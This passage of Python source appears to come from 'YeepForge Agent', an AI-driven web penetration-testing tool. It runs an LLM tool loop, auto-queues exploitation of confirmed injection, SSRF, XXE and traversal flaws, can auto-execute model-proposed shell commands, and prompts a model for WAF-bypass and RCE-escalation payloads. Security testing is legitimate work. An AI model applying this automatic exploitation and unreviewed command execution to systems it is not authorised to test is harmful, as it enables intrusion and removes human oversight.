                    model=model, max_tokens=MAX_TOKENS, system=system,
                    tools=TOOLS, messages=messages,
                )
            except Exception as exc:
                warn(f"Claude API error: {exc}")
                break

            tool_use_block = next((b for b in resp.content if b.type == "tool_use"), None)
            if not tool_use_block:
                text_block = next((b for b in resp.content if b.type == "text"), None)
                if text_block:
                    info(f"Agent text (no tool): {text_block.text[:200]}")
                break

            tool_name = tool_use_block.name
            tool_args = tool_use_block.input or {}
            tool_id   = tool_use_block.id

        elif backend_type in ("openai", "gemini") and client:
            # OpenAI / Gemini - use smart fallback since these need different tool format
            hints = _analyze_result(last_results[-1] if last_results else "")
            tool_name, tool_args = _smart_next_tool(completed_tools, target_url, hints)
            # But let the model refine via text call
            if isinstance(client, dict):
                target_url = SESSION.get("target_url", target_url)
                msgs = [{"role": "system", "content": system}] + messages[-6:]
                raw_resp = _openai_chat(client["key"], model, msgs,
                                        base_url=client.get("base", "https://api.openai.com/v1"))
                # Try to extract tool call from response
                parsed_name, parsed_args = _parse_ollama_tool_call(raw_resp)
                if parsed_name and parsed_name in TOOL_MAP:
                    tool_name, tool_args = parsed_name, parsed_args
            tool_id = f"oai_{round_num}"

        else:
            # ── Ollama: smart JSON-prompt (context-aware) ─────────────────────
            target_url = SESSION.get("target_url", target_url)
            last_result = last_results[-1] if last_results else ""

            # Analyze previous result for smart decisions
            hints = _analyze_result(last_result)

            # Smart suggestion - context-aware, not just linear
            suggested_name, suggested_args = _smart_next_tool(
                completed_tools, target_url, hints
            )

            # Build compact prompt (fast inference)
            ollama_prompt = _build_ollama_prompt(
                target_url, completed_tools, last_result, hints
            )

            raw = _ollama_generate(
                model=model,
                prompt=ollama_prompt,
                timeout=OLLAMA_API_TIMEOUT,
                num_predict=128,   # Only need ~30 tokens for JSON
            )

            if "[Ollama error" in raw or not raw.strip():
                warn("Ollama error/empty - using smart fallback")
                tool_name, tool_args = suggested_name, suggested_args
            else:
                tool_name, tool_args = _parse_ollama_tool_call(raw)
                if not tool_name or tool_name not in TOOL_MAP:
                    # Model gave bad JSON - use smart suggestion
                    tool_name, tool_args = suggested_name, suggested_args
                    info(f"Smart fallback → {tool_name}")

            # Always ensure url is present
            if "url" not in tool_args and tool_name not in ("check_ssl_tls", "finish_assessment"):
                tool_args["url"] = target_url
            # check_ssl_tls needs host, not url
            if tool_name == "check_ssl_tls" and "host" not in tool_args:
                tool_args["host"] = target_url.split("//")[-1].split("/")[0]
            tool_id = f"ollama_{round_num}"

        if not tool_name:
            warn("No tool name returned - stopping.")
            break

        _print_agent_header(round_num, tool_name)

        # ── Execute tool ───────────────────────────────────────────────────────
        result = _execute_tool(tool_name, tool_args)
        _print_tool_result(tool_name, result)
        md_log.add_round(round_num, tool_name, tool_args, result)
        completed_tools.append(tool_name)
        last_results.append(result[:500])
        if len(last_results) > 10:
            last_results = last_results[-10:]

        # ── Feed knowledge base with discovered intelligence ───────────────────
        hints = _analyze_result(result)
        if tool_name == "recon_target":
            tech = [k for k in ["php","asp","java","node","python","wordpress","drupal"]
                    if hints.get(k)]
            kb_record_target(domain, tech, SESSION.get("agent_endpoints", [])[:20],
                             notes=f"Recon run {datetime.now().strftime('%Y-%m-%d')}")
        if "CONFIRMED" in result or "CRITICAL" in result:
            # Extract vuln info and persist
            vuln_match = re.search(r'([\w\s]+(?:CONFIRMED|CRITICAL)[^\n]*)', result)
            if vuln_match:
                kb_record_finding(domain, vuln_match.group(0)[:80], "Critical",
                                  "", result[:300], "", target_url)

        # ── Auto-trigger deep exploit on confirmation ─────────────────────────
        if ("CONFIRMED" in result and tool_name not in
                ("exploit_vulnerability", "report_finding", "generate_report")):
            # Map tool → vuln type for exploit
            exploit_map = {
                "test_sql_injection": "sqli",
                "test_command_injection": "rce",
                "test_ssrf": "ssrf",
                "test_path_traversal": "lfi",
                "test_ssti": "ssti",
                "test_xxe": "xxe",
            }
            if tool_name in exploit_map and "exploit_vulnerability" not in completed_tools:
                info(f"Vuln confirmed - queuing deep exploitation of {exploit_map[tool_name]}")
                SESSION["_pending_exploit"] = {
                    "url": target_url, "vuln_type": exploit_map[tool_name]
                }

        # ── Check mission complete ─────────────────────────────────────────────
        if tool_name == "finish_assessment":
            mission_done = True
            break

        # ── Feed result back to AI ─────────────────────────────────────────────
        if client:
            # Claude: proper tool_result message format
            messages.append({"role": "assistant", "content": resp.content})
            messages.append({
                "role": "user",
                "content": [{"type": "tool_result", "tool_use_id": tool_id, "content": result}],
            })
        else:
            # Ollama: just append result as context for the next _build_ollama_prompt()
            # We don't use a chat history - each round builds a fresh prompt
            # Just store last result in messages[-1] for the prompt builder
            messages = [{"role": "user", "content": result[:800]}]

        # Trim message history to avoid context overflow
        if len(messages) > 30:
            messages = messages[:2] + messages[-20:]

        save_session()

    findings = SESSION.get("vulns_found", [])
    status = "completed" if mission_done else "max_rounds"
    md_log.add_summary(round_num, status, findings)

    # ── Print summary table ────────────────────────────────────────────────────
    sev_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    for f in findings:
        sev = f.get("severity", "Info")
        sev_counts[sev] = sev_counts.get(sev, 0) + 1

    print(f"\n{AGENT_GREEN}{'═' * 68}{RST}")
    print(f"{AGENT_GREEN}{BOLD}  ASSESSMENT SUMMARY{RST}")
    print(f"{AGENT_GREEN}{'═' * 68}{RST}")
    print(f"  Target:  {NEON_CYN}{target_url}{RST}")
    print(f"  Rounds:  {round_num}  |  Status: {status}")
    print(f"  Tools:   {len(set(completed_tools))} unique tools executed")
    print(f"\n  {BOLD}Findings by severity:{RST}")
    sev_colors = {"Critical": NEON_RED, "High": NEON_RED, "Medium": NEON_YEL,
                  "Low": NEON_CYN, "Info": DIM}
    for sev in ["Critical", "High", "Medium", "Low", "Info"]:
        count = sev_counts[sev]
        if count:
            bar = "█" * min(count, 20)
            print(f"  {sev_colors[sev]}{sev:10}{RST}  {bar} {count}")
    print(f"\n  {BOLD}Top findings:{RST}")
    for f in sorted(findings, key=lambda x: ["Critical","High","Medium","Low","Info"].index(
            x.get("severity","Info") if x.get("severity","Info") in ["Critical","High","Medium","Low","Info"] else "Info"
        ))[:8]:
        sev = f.get("severity", "?")
        c = sev_colors.get(sev, RST)
        print(f"  {c}[{sev:8}]{RST}  {f.get('title','?')[:55]}")
    print(f"{AGENT_GREEN}{'═' * 68}{RST}")

    # Auto-generate HTML report
    if findings:
        try:
            from modules import reporting
            success(f"HTML report → {reporting.save_html()}")
        except Exception as exc:
            info(f"Report generation: {exc}")

    success(
        f"Assessment {status} - {round_num} rounds, "
        f"{len(findings)} finding(s) recorded"
    )
    return findings


# ── Standalone helpers (interactive / payload generator) ─────────────────────

# URL handled in backends.py
OLLAMA_URL = "http://127.0.0.1:11434"


def _run_ollama_stream(messages: list, system: str) -> str:
    """Stream Ollama /api/chat response token-by-token. Returns full text."""
    models = _get_ollama_models()
    model  = SESSION.get("_ollama_model") or (_best_model(models) if models else "llama3.2:3b")

    print(f"\n{AGENT_GREEN}{'─' * 68}{RST}")
    print(f"{AGENT_GREEN}{BOLD}  YeepForge Agent  {SOFT_WHITE}({model}){RST}")
    print(f"{AGENT_GREEN}{'─' * 68}{RST}")

    full_msgs = [{"role": "system", "content": system}] + messages
    full_text: list[str] = []
    try:
        for token in _ollama_chat_stream(model=model, messages=full_msgs, timeout=300):
            sys.stdout.write(f"{PURE_WHITE}{token}{RST}")
            sys.stdout.flush()
            full_text.append(token)
    except Exception as exc:
        print(f"\n{NEON_RED}[Stream error: {exc}]{RST}")

    print(f"\n{AGENT_GREEN}{'─' * 68}{RST}\n")
    return "".join(full_text)


def _chat(client, messages: list, system: str) -> tuple:
    """
    Returns (reply_text, streamed).
    Claude API: (text, False).
    Ollama:     (text, True) - already printed to stdout live.
    """
    if _HAS_ANTHROPIC and client:
        try:
            resp = client.messages.create(
                model=MODEL,
                max_tokens=MAX_TOKENS,
                system=system,
                messages=messages,
            )
            return resp.content[0].text, False
        except Exception as exc:
            warn(f"Claude API error: {exc}")
            warn("Falling back to Ollama…")

    try:
        text = _run_ollama_stream(messages, system)
        return text, True
    except Exception as exc:
        return f"[No AI response - {exc}]", False


def _render_agent_msg(text: str, already_printed: bool = False) -> None:
    """Pretty-print agent response. Skip if Ollama already streamed it."""
    if already_printed:
        return
    print(f"\n{AGENT_GREEN}{'─' * 68}{RST}")
    print(f"{AGENT_GREEN}{BOLD}  YeepForge Agent{RST}")
    print(f"{AGENT_GREEN}{'─' * 68}{RST}")
    for line in text.splitlines():
        if line.startswith("CMD:"):
            print(f"  {NEON_CYN}{BOLD}{line}{RST}")
        elif line.startswith("VULN:"):
            print(f"  {NEON_RED}{BOLD}{line}{RST}")
        elif line.startswith("##") or line.startswith("#"):
            print(f"  {AGENT_GREEN}{BOLD}{line}{RST}")
        elif line.strip().startswith(("- ", "* ")):
            print(f"  {NEON_YEL}{line}{RST}")
        else:
            print(f"  {AGENT_TEXT}{line}{RST}")
    print(f"{AGENT_GREEN}{'─' * 68}{RST}\n")


def _build_system_prompt() -> str:
    """System prompt for conversational (interactive) mode."""
    target = SESSION.get("target_url", "unknown")
    engagement = SESSION.get("engagement", "Web Pentest")
    cookies = bool(SESSION.get("cookies"))
    auth = bool(SESSION.get("auth_token") or SESSION.get("username"))
    return f"""You are YeepForge Agent, an expert web application penetration testing AI assistant.

ENGAGEMENT: {engagement}
TARGET: {target}
AUTHENTICATED: {auth} (cookies set: {cookies})

OWASP Top 10 2021:
A01: Broken Access Control - IDOR, path traversal, forced browsing, JWT attacks
A02: Cryptographic Failures - weak crypto, cleartext, sensitive data exposure
A03: Injection - SQLi, XSS, SSTI, Command Injection, XXE, LDAP, NoSQL
A04: Insecure Design - business logic, race conditions, mass assignment
A05: Security Misconfiguration - headers, CORS, debug endpoints, default creds
A06: Vulnerable Components - outdated libs, CVE scanning
A07: Authentication Failures - brute force, session hijacking, MFA bypass
A08: Integrity Failures - deserialization, SRI, CI/CD exposure
A09: Logging Failures - log injection, missing audit
A10: SSRF - internal port scan, cloud metadata, gopher protocol

When suggesting commands format as: CMD: <command>
When identifying a vulnerability format as: VULN: [Severity] Title - Detail
"""


def _format_session_context() -> str:
    target   = SESSION.get("target_url", "not set")
    cookies  = SESSION.get("cookies", "")
    proxy    = SESSION.get("proxy", "")
    findings = SESSION.get("findings", []) + SESSION.get("vulns_found", [])
    endpoints = SESSION.get("endpoints", [])
    lines = [
        f"Target: {target}",
        f"Cookies: {'set' if cookies else 'not set'}",
        f"Proxy: {proxy or 'none'}",
        f"Findings so far: {len(findings)}",
        f"Known endpoints: {len(endpoints)}",
    ]
    if findings:
        lines.append("\nRecent findings:")
        for f in findings[-5:]:
            lines.append(
                f"  [{f.get('severity','?')}] {f.get('title','?')} - {f.get('owasp','')}"
            )
    return "\n".join(lines)


def _execute_cmd(cmd: str) -> str:
    """Execute a command from interactive mode and return output."""
    info(f"Agent executing: {DIM}{cmd}{RST}")
    cookies = SESSION.get("cookies", "")
    proxy   = SESSION.get("proxy", "")
    if cmd.startswith("curl") and cookies and "-b " not in cmd and "--cookie" not in cmd:
        cmd = cmd.replace("curl ", f'curl -b "{cookies}" ', 1)
    if cmd.startswith("curl") and proxy and "--proxy" not in cmd and "-x " not in cmd:
        cmd = cmd.replace("curl ", f'curl --proxy "{proxy}" ', 1)
    out, err, rc = run_cmd(cmd, timeout=120)
    result = out or err or "(no output)"
    if len(result) > 3000:
        result = result[:3000] + "\n... (truncated)"
    return result


def _parse_agent_response(text: str):
    """Extract CMD: and VULN: directives from agent response."""
    cmds  = re.findall(r"CMD:\s*(.+?)(?:\n|$)", text)
    vulns = []
    for m in re.findall(r"VULN:\s*\[(\w+)\]\s*(.+?)\s*-\s*(.+?)(?:\n|$)", text):
        severity, title, detail = m
        vulns.append({"severity": severity, "title": title, "detail": detail})
    return cmds, vulns


def interactive_mode(client, model: str = "") -> None:
    """Interactive chat mode with optional command auto-execution."""
    system = _build_system_prompt()
    messages: list = []
    run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOG_DIR / f"agent_{run_id}.md"
    log_lines = [
        f"# YeepForge Agent Session - {run_id}\n\n",
        f"Target: {SESSION.get('target_url')}\n\n",
    ]

    auto_exec = prompt("[?] Auto-execute CMD: directives? [y/N]").lower() == "y"
    if auto_exec:
        warn("Auto-execution enabled - agent will run commands automatically!")

    model_label = SESSION.get("_ollama_model", "") or model or "default"
    info(f"Session log → {log_path}")
    print(f"\n  {SOFT_WHITE}Exit: 0 or /quit  |  Commands: /context  /findings  /auto  /model <name>{RST}")

    ctx = _format_session_context()
    messages.append({
        "role": "user",
        "content": f"Starting pentest session. Current context:\n{ctx}\n\nWhat should we test first?",
    })
    reply, streamed = _chat(client, messages, system)
    _render_agent_msg(reply, already_printed=streamed)
    messages.append({"role": "assistant", "content": reply})
    log_lines.append(f"## Agent\n{reply}\n\n")

    while True:
        try:
            user_input = input(
                f"\n  {NEON_GRN}┌─[{RST}{NEON_CYN}{BOLD}WS-Agent{RST}{NEON_GRN}]{RST}\n"
                f"  {NEON_GRN}└──▶{RST} "
            ).strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not user_input:
            continue

        if user_input in ("/quit", "/exit", "/q", "q", "exit", "quit", "0", "back", ":q"):
            break
        elif user_input == "/context":
            print(_format_session_context())
            continue
        elif user_input == "/findings":
            findings = SESSION.get("findings", []) + SESSION.get("vulns_found", [])
            if findings:
                for f in findings:
                    print(f"  [{f.get('severity','?')}] {f.get('title','?')} - {f.get('owasp','')}")
            else:
                info("No findings recorded yet")
            continue
        elif user_input == "/auto":
            auto_exec = not auto_exec
            info(f"Auto-execution {'enabled' if auto_exec else 'disabled'}")
            continue
        elif user_input.startswith("/model "):
            new_model = user_input[7:].strip()
            SESSION["_ollama_model"] = new_model
            info(f"Model set to: {new_model}")
            continue

        messages.append({"role": "user", "content": user_input})
        log_lines.append(f"## User\n{user_input}\n\n")

        reply, streamed = _chat(client, messages, system)
        _render_agent_msg(reply, already_printed=streamed)
        messages.append({"role": "assistant", "content": reply})
        log_lines.append(f"## Agent\n{reply}\n\n")

        cmds, vulns = _parse_agent_response(reply)
        for vuln in vulns:
            add_vuln(vuln["title"], vuln["severity"], "AGENT", vuln["detail"],
                     SESSION.get("target_url", ""))

        if cmds:
            if auto_exec:
                for cmd in cmds[:3]:
                    result = _execute_cmd(cmd)
                    print(f"\n{NEON_CYN}Command output:{RST}")
                    print(result[:1000])
                    messages.append({"role": "user", "content": f"Command output:\n{result}"})
                    follow, streamed = _chat(client, messages, system)
                    _render_agent_msg(follow, already_printed=streamed)
                    messages.append({"role": "assistant", "content": follow})
            else:
                print(f"\n  {NEON_CYN}Agent suggests running:{RST}")
                for cmd in cmds:
                    print(f"  {BOLD}{cmd}{RST}")
                if prompt("Execute these commands? [y/N]").lower() == "y":
                    for cmd in cmds[:3]:
                        result = _execute_cmd(cmd)
                        print(result[:1000])
                        messages.append({"role": "user", "content": f"Command output:\n{result}"})
                    follow, streamed = _chat(client, messages[-10:], system)
                    _render_agent_msg(follow, already_printed=streamed)
                    messages.append({"role": "assistant", "content": follow})

        if len(messages) > 40:
            messages = messages[:2] + messages[-20:]

        save_session()

    log_path.write_text("".join(log_lines))
    success(f"Session log saved → {log_path}")


def payload_generator(client, model: str = "") -> None:
    """Generate custom payloads via AI."""
    system = _build_system_prompt()

    print(f"""
  {NEON_CYN}Payload types:{RST}
  [1] SQL Injection
  [2] XSS
  [3] SSTI
  [4] Command Injection
  [5] XXE
  [6] SSRF
  [7] JWT bypass
  [8] Custom (describe your scenario)
""")
    ptype = prompt("Payload type")
    context = prompt("Additional context (target tech, WAF, framework)")

    payload_map = {
        "1": "SQL Injection", "2": "XSS", "3": "SSTI", "4": "Command Injection",
        "5": "XXE", "6": "SSRF", "7": "JWT bypass",
    }
    pname = payload_map.get(ptype, "Custom")

    messages = [{
        "role": "user",
        "content": (
            f"Generate a comprehensive set of {pname} payloads for the following scenario:\n"
            f"Target: {SESSION.get('target_url', 'unknown')}\n"
            f"Context: {context}\n"
            f"Include: basic probes, WAF bypass variants, blind/OOB variants, RCE escalation.\n"
            f"Format each payload clearly with explanation."
        ),
    }]

    reply, streamed = _chat(client, messages, system)
    _render_agent_msg(reply, already_printed=streamed)

    if prompt("Save payloads to file? [y/N]").lower() == "y":
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = OUTPUT_DIR / f"payloads_{pname.replace(' ', '_')}_{ts}.txt"
        path.write_text(reply)
        success(f"Payloads saved → {path}")


def _show_backend_setup() -> None:
    print(f"""
  {NEON_RED}{BOLD}No AI backend available.{RST}

  {NEON_CYN}{BOLD}Option 1 - Claude API (recommended):{RST}
    1. Get API key: https://console.anthropic.com
    2. Set in .env:  echo 'ANTHROPIC_API_KEY=sk-ant-...' >> .env
    3. Or export:    export ANTHROPIC_API_KEY=sk-ant-...
    4. Install:      pip install anthropic

  {NEON_CYN}{BOLD}Option 2 - Ollama (local, free):{RST}
    1. Install: curl -fsSL https://ollama.com/install.sh | sh
    2. Start:   ollama serve
    3. Pull:    ollama pull llama3.2
    4. Verify:  curl http://127.0.0.1:11434/api/tags
""")


def run() -> None:
    print_banner("YEEPFORGE AGENT", "Autonomous Web Pentest - OWASP Top 10")
    info(kb_summary())

    client, model, backend_label, backend_type = _setup_backend()

    if not backend_label:
        backend_type = ""
        # Diagnose Ollama state
        ollama_bin    = shutil.which("ollama")
        pulled_models: list = []
        if ollama_bin:
            out, _, _ = run_cmd("ollama list", timeout=5)
            if out:
                lines = [l.strip() for l in out.splitlines() if l.strip()]
                for line in lines[1:]:
                    parts = line.split()
                    if parts:
                        pulled_models.append(parts[0])

        bin_s   = f"{NEON_GRN}{ollama_bin}{RST}" if ollama_bin else f"{NEON_RED}NOT FOUND{RST}"
        model_s = (
            f"{NEON_GRN}{', '.join(pulled_models)}{RST}"
            if pulled_models else f"{NEON_RED}none pulled{RST}"
        )

        print(f"""
  {NEON_YEL}[!]{RST} No AI backend detected automatically.

  {SOFT_WHITE}Ollama binary : {RST}{bin_s}
  {SOFT_WHITE}Pulled models : {RST}{model_s}

  {NEON_CYN}[1]{RST}  Enter Anthropic API key  {SOFT_WHITE}(Claude){RST}
  {NEON_CYN}[1G]{RST} Enter Groq API key       {SOFT_WHITE}(FREE · llama-3.3-70b · fastest){RST}
  {NEON_CYN}[1O]{RST} Enter OpenAI API key     {SOFT_WHITE}(GPT-4o){RST}
  {NEON_CYN}[1D]{RST} Enter DeepSeek API key   {SOFT_WHITE}(deepseek-chat){RST}
  {NEON_CYN}[2]{RST}  Start Ollama service     {SOFT_WHITE}(auto-start · local · free){RST}
  {NEON_CYN}[3]{RST}  Retry detection
  {NEON_CYN}[4]{RST}  Show setup instructions
  {NEON_GRN}[0]{RST}  Back
""")
        c = prompt("Choice")

        if c == "1":
            if not _HAS_ANTHROPIC:
                error("anthropic library missing - run: pip install anthropic")
                pause()
                return
            api_key = prompt("Anthropic API key (sk-ant-...)")
            if not api_key:
                return
            try:
                client = anthropic.Anthropic(api_key=api_key)
                SESSION["_anthropic_key"] = api_key
                model = MODEL
                backend_label = f"Claude {MODEL}"
                backend_type  = "claude"
                success(f"Claude API connected ({MODEL})")
                if prompt("Save key to .env? [y/N]").lower() == "y":
                    env_path = Path(__file__).parents[2] / ".env"
                    with open(env_path, "a") as f:
                        f.write(f"\nANTHROPIC_API_KEY={api_key}\n")
                    success(f"Key saved → {env_path}")
            except Exception as exc:
                error(f"API key error: {exc}")
                pause()
                return

        elif c == "1G":  # Groq
            key = prompt("Groq API key (from console.groq.com - free tier available)")
            if key:
                client = {"key": key, "base": "https://api.groq.com/openai/v1"}
                model  = "llama-3.3-70b-versatile"
                backend_label = "Groq (llama-3.3-70b) - FREE"
                backend_type  = "openai"
                SESSION["_groq_key"] = key
                success("Groq connected - very fast inference!")
        elif c == "1O":  # OpenAI
            key = prompt("OpenAI API key (sk-...)")
            if key:
                client = {"key": key, "base": "https://api.openai.com/v1"}
                model  = "gpt-4o"
                backend_label = "OpenAI GPT-4o"
                backend_type  = "openai"
                SESSION["_openai_key"] = key
        elif c == "1D":  # DeepSeek
            key = prompt("DeepSeek API key")
            if key:
                client = {"key": key, "base": "https://api.deepseek.com/v1"}
                model  = "deepseek-chat"
                backend_label = "DeepSeek Chat"
                backend_type  = "openai"
                SESSION["_deepseek_key"] = key

        elif c == "2":
            backend_type = "ollama"
            if not ollama_bin:
                error("ollama not found in PATH")
                info("Install: curl -fsSL https://ollama.com/install.sh | sh")
                pause()
                return
            if not pulled_models:
                warn("No models pulled yet!")
                info("Run:  ollama pull llama3.2")
                pause()
                return
            info("Starting ollama serve in background…")
            try:
                subprocess.Popen(
                    [ollama_bin, "serve"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True,
                )
            except Exception as exc:
                warn(f"Auto-start failed: {exc}")
            import urllib.request as _ur
            sys.stdout.write(f"  {NEON_CYN}[*]{RST} Waiting for Ollama")
            sys.stdout.flush()
            ready = False
            om_list: list = []
            for _ in range(10):
                time.sleep(1)
                sys.stdout.write(".")
                sys.stdout.flush()
                try:
                    with _ur.urlopen("http://127.0.0.1:11434/api/tags", timeout=2) as r:
                        data = json.loads(r.read())
                        om_list = [m["name"] for m in data.get("models", [])]
                        print(f"  {NEON_GRN}Ready!{RST}")
                        ready = True
                        break
                except Exception:
                    continue
            if not ready:
                print()
            if ready and om_list:
                model = _best_model(om_list)
                backend_label = f"Ollama ({model})"
                success(f"Ollama ready - using: {NEON_CYN}{model}{RST}")
            else:
                warn("Auto-start timed out. Start manually: ollama serve")
                pause()
                return

        elif c == "3":
            info("Re-checking Ollama…")
            om_list = _get_ollama_models()
            if om_list:
                model = _best_model(om_list)
                backend_label = f"Ollama ({model})"
                success(f"Ollama detected! Using: {model}")
            else:
                warn("Ollama still not reachable at http://127.0.0.1:11434")
                pause()
                return

        elif c == "4":
            _show_backend_setup()
            pause()
            return
        else:
            return

        if not backend_label:
            error("No backend available")
            _show_backend_setup()
            pause()
            return

    success(f"AI Backend: {NEON_CYN}{backend_label}{RST}")

    # Show model switch tip for Ollama
    if "Ollama" in backend_label:
        models_avail = _get_ollama_models()
        if len(models_avail) > 1:
            info(f"Available models: {', '.join(models_avail)}")
            info("Switch: /model <name> in chat  |  or set session '_ollama_model'")

    target = SESSION.get("target_url", "")
    if not target:
        target = prompt("Target URL (e.g. https://example.com)")
        if target:
            SESSION["target_url"] = target

    if target:
        info(f"Target URL: {NEON_CYN}{target}{RST}")

    code_path = SESSION.get("sast_target", "")
    sast_status = (
        f"{NEON_GRN}SET{RST} {SOFT_WHITE}({os.path.basename(code_path)}){RST}"
        if code_path and os.path.isdir(code_path)
        else f"{DIM}not set{RST}"
    )

    tool_count = len(TOOL_MAP)
    print(f"""
  {NEON_CYN}[1]{RST} Autonomous Pentest     {SOFT_WHITE}({tool_count} tools · OWASP Top 10 · auto-report · SAST){RST}
  {NEON_CYN}[2]{RST} Interactive Chat Mode  {SOFT_WHITE}(conversational AI · streaming · auto-exec){RST}
  {NEON_CYN}[3]{RST} Payload Generator      {SOFT_WHITE}(AI-generated · SQLi/XSS/RCE/SSRF/XXE/JWT){RST}
  {NEON_CYN}[4]{RST} Code Analysis (SAST)   {SOFT_WHITE}(15 AI skills · static source code review){RST}
  {NEON_CYN}[5]{RST} Set Source Code Path   {SOFT_WHITE}(SAST target: {sast_status}){RST}
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    try:
        if c == "1":
            run_id  = datetime.now().strftime("%Y%m%d_%H%M%S")
            md_path = LOG_DIR / f"agent_{run_id}.md"
            md_log  = AgentMarkdownLog(md_path, target, model)
            info(f"Log → {md_path}")
            info(f"Backend: {backend_label}  |  Tools: {len(TOOL_MAP)}")
            if code_path and os.path.isdir(code_path):
                info(f"SAST: {NEON_CYN}{code_path}{RST}")
            info("Press Ctrl+C to stop")
            run_agent(client, model, target, md_log, backend_type=backend_type)
            success(f"Assessment complete - report: {md_path}")
        elif c == "2":
            interactive_mode(client, model)
        elif c == "3":
            payload_generator(client, model)
        elif c == "4":
            _run_sast_mode(client, model)
        elif c == "5":
            new_path = prompt("Source code directory path (absolute)")
            if new_path and os.path.isdir(new_path):
                SESSION["sast_target"] = new_path
                success(f"SAST code path set: {new_path}")
                info("Now run [1] Autonomous Pentest or [4] Code Analysis")
            elif new_path:
                warn(f"Directory not found: {new_path}")
    except KeyboardInterrupt:
        warn("Agent stopped")

    save_session()


def _run_sast_mode(client, model: str) -> None:
    """Dedicated SAST (Static Application Security Testing) mode."""
    print_banner("CODE ANALYSIS - SAST", "tmrswrr · 15 AI Skills · Static Source Code Review")

    code_path = SESSION.get("sast_target", "")
    if not code_path or not os.path.isdir(code_path):
        code_path = prompt("Source code directory path (absolute, e.g. /home/user/myapp)")
        if not code_path or not os.path.isdir(code_path):
            error("Invalid directory - SAST requires a source code path")
            return
        SESSION["sast_target"] = code_path
        save_session()

    info(f"Code path: {NEON_CYN}{code_path}{RST}")

    sast_skills = [
        ("1",  "Architecture Analysis",  "architecture", "tech stack · entry points · data flow · trust boundaries"),
        ("2",  "SQL Injection",          "sqli",         "string concat · ORM raw · dynamic identifiers"),
        ("3",  "Cross-Site Scripting",   "xss",          "HTML/JS sinks · DOM XSS · template unescaped"),
        ("4",  "SSRF",                   "ssrf",         "outbound HTTP sinks · user-controlled URLs"),
        ("5",  "Remote Code Execution",  "rce",          "command injection · eval · deserialization"),
        ("6",  "XXE",                    "xxe",          "XML parsing without hardening"),
        ("7",  "File Upload",            "fileupload",   "extension bypass · webshell upload"),
        ("8",  "Path Traversal",         "pathtraversal","file path from user input"),
        ("9",  "SSTI",                   "ssti",         "template rendering with user data"),
        ("10", "JWT Security",           "jwt",          "alg confusion · missing validation"),
        ("11", "IDOR",                   "idor",         "missing ownership checks"),
        ("12", "Missing Auth",           "missingauth",  "unauthenticated endpoints"),
        ("13", "Business Logic",         "businesslogic","price manipulation · workflow bypass"),
        ("14", "GraphQL Security",       "graphql",      "injection · introspection · batching"),
        ("F",  "Full Scan (All Skills)", "all",          "runs 1-14 + final report"),
        ("R",  "Generate Final Report",  "report",       "consolidate all results"),
    ]

    while True:
        # Show status for each skill
        from pathlib import Path
        sast_d = Path(code_path) / "sast"
        print(f"\n  {NEON_GRN}Code:{RST} {PURE_WHITE}{code_path}{RST}\n")
        print(f"  {NEON_CYN}{'─'*65}{RST}")
        for key, label, skill_id, desc in sast_skills:
            if skill_id in ("all", "report"):
                result_file = "final-report.md" if skill_id == "report" else None
            else:
                skill_map = {
                    "architecture": "architecture.md", "sqli": "sqli-results.md",
                    "xss": "xss-results.md", "ssrf": "ssrf-results.md",
                    "rce": "rce-results.md", "xxe": "xxe-results.md",
                    "fileupload": "fileupload-results.md", "pathtraversal": "pathtraversal-results.md",
                    "ssti": "ssti-results.md", "jwt": "jwt-results.md",
                    "idor": "idor-results.md", "missingauth": "missingauth-results.md",
                    "businesslogic": "businesslogic-results.md", "graphql": "graphql-results.md",
                }
                result_file = skill_map.get(skill_id)

            done = result_file and (sast_d / result_file).exists() if result_file else False
            status = f"{NEON_GRN}✓{RST}" if done else f"{DIM}○{RST}"
            print(f"  {status} {NEON_CYN}[{key:>2}]{RST}  {PURE_WHITE}{label:<28}{RST}  {SOFT_WHITE}{desc}{RST}")

        print(f"  {NEON_CYN}{'─'*65}{RST}")
        print(f"  {NEON_CYN}[ 5]{RST}  {PURE_WHITE}Change code directory{RST}")
        print(f"  {NEON_GRN}[ 0]{RST}  {PURE_WHITE}Back to agent menu{RST}")
        print()

        c = prompt("Choice").strip().upper()
        if c == "0":
            break
        elif c == "5":
            new_path = prompt("New source code path")
            if new_path and os.path.isdir(new_path):
                code_path = new_path
                SESSION["sast_target"] = code_path
                save_session()
            continue

        # Map choice to skill
        skill_map_choice = {
            "1": "architecture", "2": "sqli",    "3": "xss",
            "4": "ssrf",         "5": "rce",      "6": "xxe",
            "7": "fileupload",   "8": "pathtraversal", "9": "ssti",
            "10": "jwt",         "11": "idor",   "12": "missingauth",
            "13": "businesslogic","14": "graphql",
            "F": "all",          "R": "report",
        }
        skill_id = skill_map_choice.get(c)
        if not skill_id:
            warn("Invalid choice")
            continue

        section(f"Running: {skill_id.upper()}")
        info(f"Code path: {code_path}")

        result = tool_analyze_source_code(code_path=code_path, skill=skill_id)
        print(f"\n{NEON_GRN}{'─'*65}{RST}")
        # Print first 60 lines of result
        for line in result.splitlines()[:60]:
            if "[VULNERABLE]" in line:
                print(f"  {NEON_RED}{BOLD}{line}{RST}")
            elif "[LIKELY" in line:
                print(f"  {NEON_YEL}{line}{RST}")
            elif line.startswith("#"):
                print(f"  {NEON_CYN}{BOLD}{line}{RST}")
            elif "SAST Analysis complete" in line or "Total findings" in line:
                print(f"  {NEON_GRN}{BOLD}{line}{RST}")
            else:
                print(f"  {PURE_WHITE}{line}{RST}")
        print(f"{NEON_GRN}{'─'*65}{RST}")

        save_session()
